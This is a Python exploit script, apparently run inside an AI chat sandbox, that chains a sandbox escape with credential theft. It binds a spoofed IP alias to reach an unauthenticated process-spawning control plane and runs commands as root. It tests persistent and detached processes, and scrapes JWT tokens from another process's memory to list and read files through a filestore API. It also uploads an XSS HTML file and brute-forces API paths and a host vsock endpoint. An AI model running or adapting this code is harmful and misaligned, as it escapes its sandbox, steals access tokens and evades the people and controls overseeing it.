#!/usr/bin/env python3
# mediafit.py v8.2 -- WORKING SPAWN -> ESCALATION
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random

VER, NONCE = "8.2", "%04x" % random.randint(0, 0xffff)
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R)+"\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=25):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        s = socket.socket(); s.bind((ip, 0)); s.close(); return True
    except Exception: return False

def ws_hs(src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        s.bind((src, 0)); s.connect(("127.0.0.1", 2024))
    except Exception: return None
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        return s if b" 101 " in h.split(b"\r\n")[0]+b" " else None
    except Exception:
        try: s.close()
        except Exception: pass
        return None

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_read(s, dur=4.0, show=True):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        t = d.decode(errors="replace")
        if show and op in (1, 2):
            w("        << %s(%d) %s" % ("BIN" if op == 2 else "TEXT", len(d), t[:1500].replace("\n"," | ")))
        out.append(t)
    return out

def run(prog, args, label, uid=0, gid=0, mem=268435456, clear=False, env=None,
        tmo=30, dur=5.0, pid=None):
    pid = pid or ("mf_" + re.sub(r"\W", "_", label))[:24]
    cr = {"name": prog, "args": args, "env_vars": env or {}, "timeout": tmo,
          "clear_env": clear, "uid": uid, "gid": gid,
          "allow_process_id_reuse": True, "reattachable": True}
    if mem is not None: cr["memory_limit_bytes"] = mem
    s = ws_hs(ALIAS)
    if not s: w("  [%s] hs fail" % label); return None
    try:
        ws_send(s, json.dumps({"process_id": pid, "create_req": cr}))
        return ws_read(s, dur)
    finally:
        try: s.close()
        except Exception: pass

SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00",
                          socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

def main():
    global ALIAS
    w("="*70); w("MEDIAFIT RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE,
      time.strftime("%Y-%m-%d %H:%M:%S"))); w("="*70)
    sec("0. FACTS")
    w("kernel: " + sh("uname -a").strip())
    w("/root/.ssh: " + sh("ls -la /root/.ssh 2>&1 | head").replace("\n", " | "))
    w("/root/.mediafit: " + sh("ls -la /root/.mediafit 2>&1 | head").replace("\n", " | "))
    w("persist logs: " + sh("wc -l /tmp/mf_api_persist.log /tmp/mf_nohup_persist.log 2>/dev/null").replace("\n"," | "))
    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    if not ws_hs(ALIAS): w("  BYPASS FAILED"); flush(); return
    w("  bypass OK")

    sec("A. CONFIRMED RCE VIA UNAUTHENTICATED CONTROL PLANE")
    run("/bin/sh", ["-c", "echo ===WHOAMI===; id; echo ===PWD===; pwd; echo ===UNAME===; uname -r"],
        "whoami", dur=5.0)
    w("  --- PID1 ENVIRONMENT (child inherits it; /proc/1/environ is EACCES) ---")
    run("/bin/sh", ["-c", "echo ===ENVSTART===; env | sort; echo ===ENVEND==="], "env", dur=6.0)
    w("  --- our process identity / cgroup ---")
    run("/bin/sh", ["-c", "echo CGROUP:; cat /proc/self/cgroup; echo FD:; ls /proc/self/fd | wc -l"], "cg", dur=4.0)
    w("  --- can we see PID1 fds from the child? ---")
    run("/bin/sh", ["-c", "ls -la /proc/1/fd 2>&1 | head -25"], "p1fd", dur=4.0)
    w("  --- uid bug proof (same program, uid 0 vs 1000) ---")
    run("/bin/sh", ["-c", "echo AS_ROOT; id"], "uidroot", uid=0, dur=4.0)
    run("/bin/sh", ["-c", "echo AS_1000; id"], "uid1000", uid=1000, dur=4.0)
    run("/bin/sh", ["-c", "echo AS_1000_GID0; id"], "uid1000g0", uid=1000, gid=0, dur=4.0)

    sec("B. PERSISTENCE + DETACH + SIGNAL")
    sh("rm -f /tmp/mf_api_persist.log")
    run("/bin/sh", ["-c", "while true; do date +%s >> /tmp/mf_api_persist.log; sleep 2; done"],
        "persist", tmo=None, dur=3.0)
    time.sleep(5)
    w("  api persist lines: " + sh("wc -l /tmp/mf_api_persist.log 2>/dev/null").strip())
    s = ws_hs(ALIAS)
    if s:
        ws_send(s, json.dumps({"process_id": "mf_sleep",
                 "create_req": {"name": "/bin/sh", "args": ["-c", "echo ALIVE; sleep 90"],
                                "timeout": 150, "uid": 0, "gid": 0, "reattachable": True,
                                "env_vars": {}, "clear_env": False}}))
        ws_read(s, 3.0)
        ws_send(s, '{"Detach":null}'); time.sleep(1.0); s.close()
        w("  -- reattach to detached process --")
        s2 = ws_hs(ALIAS)
        if s2:
            ws_send(s2, json.dumps({"process_id": "mf_sleep"})); ws_read(s2, 3.0); s2.close()
        w("  -- SendSignal 15 then reattach --")
        s3 = ws_hs(ALIAS)
        if s3:
            ws_send(s3, '{"SendSignal":15}'); ws_read(s3, 2.0, show=False); s3.close()
            s4 = ws_hs(ALIAS)
            if s4:
                ws_send(s4, json.dumps({"process_id": "mf_sleep"})); ws_read(s4, 3.0); s4.close()
    w("  -- process_id collision probe (is the harness's id guessable?) --")
    for guess in ("mf_probe", "probe", "bash", "sh", "1", "0"):
        s5 = ws_hs(ALIAS)
        if not s5: break
        ws_send(s5, json.dumps({"process_id": guess})); r = ws_read(s5, 2.0, show=False); s5.close()
        w("    id=%-12s -> %s" % (guess, " ".join(r)[:80]))

    sec("C. FILESTORE: FULL DUMP + readFile + createFile")
    cands = []
    try:
        fh = open("/proc/57/mem", "rb", buffering=0); total, buf = 0, b""
        for ln in open("/proc/57/maps").read().splitlines():
            m = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m: continue
            a, b = int(m.group(1), 16), int(m.group(2), 16)
            if b-a > 64*1024*1024 or total > 400*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b-a); total += b-a
            except Exception: pass
        fh.close()
    except Exception: buf = b""
    for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,200}\.[A-Za-z0-9_\-]{8,3000}\.[A-Za-z0-9_\-]{20,200}", buf):
        cands.append(mm.group(0).decode())
    def b64d(x):
        x += "=" * (-len(x) % 4); return base64.urlsafe_b64decode(x)
    import urllib.request as ur
    def call(path, tok, fsid=FSID, method="listDirectory", extra=None, raw=None, ctype=None):
        if raw is not None:
            data, ctype = raw, ctype
        else:
            body = {"path": path}
            if fsid: body["filesystem_id"] = fsid
            if extra: body.update(extra)
            data, ctype = json.dumps(body).encode(), "application/json"
        try:
            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method, data=data,
                            headers={"Content-Type": ctype,
                                     "Connect-Protocol-Version": "1",
                                     "Authorization": "Bearer " + tok})
            with ur.urlopen(rq, timeout=9) as r: return r.status, r.read().decode(errors="replace")
        except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
        except Exception as e: return "ERR", repr(e)
    TOKS = {}
    for t in cands:
        p = t.split(".")
        if len(p) != 3 or len(p[2]) < 86: continue
        try: pl = json.loads(b64d(p[1]))
        except Exception: continue
        root = (pl.get("allowed_roots") or ["/"])[0]
        if root in TOKS: continue
        for siglen in (86, 87, 88):
            if call(root, ".".join([p[0], p[1], p[2][:siglen]]))[0] == 200:
                TOKS[root] = ".".join([p[0], p[1], p[2][:siglen]]); break
    w("  tokens=%s" % sorted(TOKS))
    for root, tok in TOKS.items():
        c, b = call(root, tok, extra={"recursive": True})
        w("  === %s (recursive) -> %s" % (root, c))
        try:
            ent = json.loads(b).get("entries") or []
            for e in ent:
                f = (e.get("file") or {}).get("file") or {}
                w("      %-58s size=%-9s mt=%-14s dl=%s" % (e.get("path"), f.get("size"),
                  f.get("mediaType"), f.get("downloadable")))
            for e in ent[:3]:
                fp = e.get("path")
                if fp:
                    c2, b2 = call(fp, tok, method="readFile")
                    w("      readFile %-40s -> %-5s %s" % (fp[:40], c2, b2[:120]))
        except Exception as ex: w("      parse err " + repr(ex))
    w("  -- createFile proper multipart on /outputs --")
    tok = TOKS.get("/outputs")
    if tok:
        b = "----mfx%d" % random.randint(10000, 99999)
        content = b"<script>alert(document.domain)</script>"
        parts = [("--"+b).encode(),
                 b'Content-Disposition: form-data; name="params"',
                 b"Content-Type: application/json", b"",
                 json.dumps({"filesystem_id": FSID, "path": "/__mf_xss.html",
                             "media_type": "text/html"}).encode(),
                 ("--"+b).encode(),
                 b'Content-Disposition: form-data; name="file"; filename="__mf_xss.html"',
                 b"Content-Type: text/html", b"", content,
                 ("--"+b+"--").encode(), b""]
        c, r = call(None, tok, method="createFile", raw=b"\r\n".join(parts),
                    ctype="multipart/form-data; boundary="+b)
        w("      createFile __mf_xss.html -> %s %s" % (c, r[:300]))
    w("  -- path brute force for the REST family (getFileUrl etc.) --")
    if TOKS:
        tok = list(TOKS.values())[0]
        for path in ("/v1/filestore/getFileUrl", "/v1/filestore/statFile", "/v1/filestore/fs/getFileUrl",
                     "/v1/filestore/listFilesystems", "/v1/filestore/reassignFilesystem",
                     "/v1/filestore/files", "/v1/filestore/fs/listFilesystems"):
            for hn in ("Authorization", "x-api-key"):
                hv = ("Bearer " + tok) if hn == "Authorization" else tok
                try:
                    rq = ur.Request("https://api.anthropic.com" + path,
                                    data=json.dumps({"path": "/", "filesystem_id": FSID}).encode(),
                                    headers={"Content-Type": "application/json", hn: hv})
                    with ur.urlopen(rq, timeout=7) as r: cc, bb = r.status, r.read().decode(errors="replace")
                except ur.HTTPError as e: cc, bb = e.code, e.read().decode(errors="replace")
                except Exception as e: cc, bb = "ERR", repr(e)
                w("    %-42s %-14s -> %-5s %s" % (path, hn, cc, bb[:95]))

    sec("D. HOST OTLP")
    AFV = getattr(socket, "AF_VSOCK", 40)
    for label, body in (("rm_empty", b"\x0a\x00"), ("scope", b"\x12\x00"), ("garbage", b"\xff\xff")):
        try:
            s = socket.socket(AFV, socket.SOCK_STREAM); s.settimeout(7.0); s.connect((2, 5005))
            s.sendall(("POST /v1/metrics HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n"
                       "Content-Type: application/x-protobuf\r\nContent-Length: %d\r\n\r\n"
                       % len(body)).encode()+body)
            d = b""
            try:
                while len(d) < 2048:
                    c = s.recv(1024)
                    if not c: break
                    d += c
            except socket.timeout: pass
            s.close(); w("  %-10s -> %s" % (label, d[:120].decode(errors="replace").replace("\r\n"," | ") or "(empty)"))
        except Exception as e: w("  %-10s ERR %r" % (label, e))
        time.sleep(0.3)

    sec("VERDICT"); w("  spawn OK · tokens=%d" % len(TOKS)); flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT + " nonce=" + NONCE)